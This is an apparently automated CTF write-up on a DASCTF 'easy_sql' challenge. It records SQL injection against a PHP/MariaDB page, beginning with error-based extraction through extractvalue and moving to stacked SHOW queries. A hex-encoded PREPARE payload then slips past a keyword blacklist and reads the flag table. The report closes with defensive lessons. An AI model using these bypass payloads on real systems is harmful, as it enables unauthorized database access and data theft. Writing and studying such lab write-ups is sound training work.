# Attack Report -- dasctf-easysql-stacked

**Generated:** 2026-07-17 01:47:45
**Target:** http://8b170b86f5144c6ceae707aa.http-ctf2.dasctf.com:80

## Target Summary

- **URL/IP:** http://8b170b86f5144c6ceae707aa.http-ctf2.dasctf.com:80
- **Technologies detected:**
  - OpenResty (nginx + Lua)
  - PHP 7.3.10
  - MariaDB (from SQL error messages)
- **Key HTTP headers:**
  - `Server: openresty`
  - `X-Powered-By: PHP/7.3.10`

## Vulnerability Discovered

- **Type:** SQL Injection (union/stacked/error-based)
- **Location:** GET parameter `inject` at `/` (index page)
- **How it was found:** Page title "easy_sql" and the HTML comment `<!-- sqlmap是没有灵魂的 -->` strongly hinted at manual SQL injection. Sending `1'` triggered a MariaDB syntax error, confirming the parameter is injected directly into a SQL query. A WAF/filter was discovered that blocks `select`, `update`, `delete`, `drop`, `insert`, `where`, and `.` (dot). The filter was bypassed using stacked queries and hex-encoded PREPARE statements.

## Exploitation Chain

**Step 1 — Recon:** `curl -s http://target:80` revealed a form with GET parameter `inject` (default value `1`), page title "easy_sql", and comment "sqlmap is soulless".

**Step 2 — SQLi confirmation:**
```
inject=1'   → MariaDB error 1064 (syntax error near ''1''')
inject=1 OR 1=1 → array(2) { [0]=> "1" [1]=> "hahahah" }
```
Confirmed: 2 columns returned, injectable.

**Step 3 — Filter discovery:**
Attempting `UNION SELECT` triggered the filter output:
```
preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
```
Inline comment bypass (`sel/**/ect`) passed the regex but was rejected by MariaDB's parser.

**Step 4 — Error-based database extraction:**
```
inject=1' and extractvalue(1,concat(0x7e,database()))-- -
→ XPATH syntax error: '~supersqli'
```
Database name: `supersqli`. `extractvalue()` contains none of the blocked keywords.

**Step 5 — Table enumeration via stacked queries:**
```
inject=1';SHOW TABLES-- -
→ 1919810931114514, words
```
Stacked queries work. `SHOW` is not in the filter.

**Step 6 — Column enumeration:**
```
inject=1';SHOW COLUMNS FROM `1919810931114514`-- -
→ flag varchar(100)
```
One column named `flag` in the target table.

**Step 7 — Flag extraction via hex-encoded PREPARE (bypasses `select` filter):**
```
inject=1';SET @a=0x53454c454354202a2046524f4d20603139313938313039333131313435313460;PREPARE s FROM @a;EXECUTE s-- -
→ CTF2{acec8278-6a67-45cd-b0d0-cf14923b17e9}
```
The hex payload decodes to: `SELECT * FROM \`1919810931114514\``. Since the SQL is hex-encoded, the `preg_match` filter never sees the keyword `select`.

## Flag(s) Captured

| Flag | Location | Method |
|------|----------|--------|
| `CTF2{acec8278-6a67-45cd-b0d0-cf14923b17e9}` | table `1919810931114514`, column `flag` | PREPARE hex-encoded SELECT bypass |

## Lessons Learned

- **Root cause:** User input (`$_GET['inject']`) is concatenated directly into a SQL query string without parameterized queries. The developer attempted a blacklist-based filter (`preg_match`), but this is trivially bypassed via stacked queries and hex-encoded PREPARE statements.
- **Defense:** Use prepared statements / parameterized queries (PDO or mysqli prepared statements). A blacklist regex is never sufficient — there are always bypasses (hex encoding, stacked queries, error-based functions like `extractvalue`). Also, disable stacked queries (`mysqli_query` instead of `mysqli_multi_query`) and the `SHOW` command for the application user.
- **Dead ends:**
  - `UNION SELECT` — blocked by filter on `select`
  - Inline comment bypass `sel/**/ect` — regex passed, but MariaDB rejected the syntax
  - `information_schema` enumeration — blocked by filter on `.` (dot)
  - Double-write `selselectect` — still contains `select` substring

## Files Saved

### recon/
- `headers.txt` (9 lines) — HTTP response headers
- `index-source.html` (21 lines) — page source with form and hints
- `whatweb.txt` (43 lines) — technology fingerprinting
- `forms.txt` (48 lines) — extracted form parameters
- `robots.txt`, `sitemap.xml`, `git-head.txt` — all returned the main page (routed via single entry)

### exploits/
- `sqli-quote.txt` — SQL error from `1'` (injection confirmed)
- `sqli-or-true.txt` — Successful `OR 1=1` bypass showing 2 columns
- `sqli-xpath-db.txt` — Error-based database name: `supersqli`
- `sqli-show-tables.txt` — Stacked `SHOW TABLES` result
- `sqli-show-dbs.txt` — Stacked `SHOW DATABASES` result
- `sqli-columns.txt` — `SHOW COLUMNS` showing `flag` column
- `sqli-prepare-flag.txt` — PREPARE hex-bypass yielding the flag
- `sqli-bypass-union.txt`, `sqli-bypass-double.txt` — Failed bypass attempts
- `sqli-union-cols.txt`, `sqli-dbname.txt`, `sqli-tables.txt` — Filter-blocked attempts

### flags/
- `flag.txt` — Extracted flag
- `found-flags.txt` — Automated find-flag.sh output
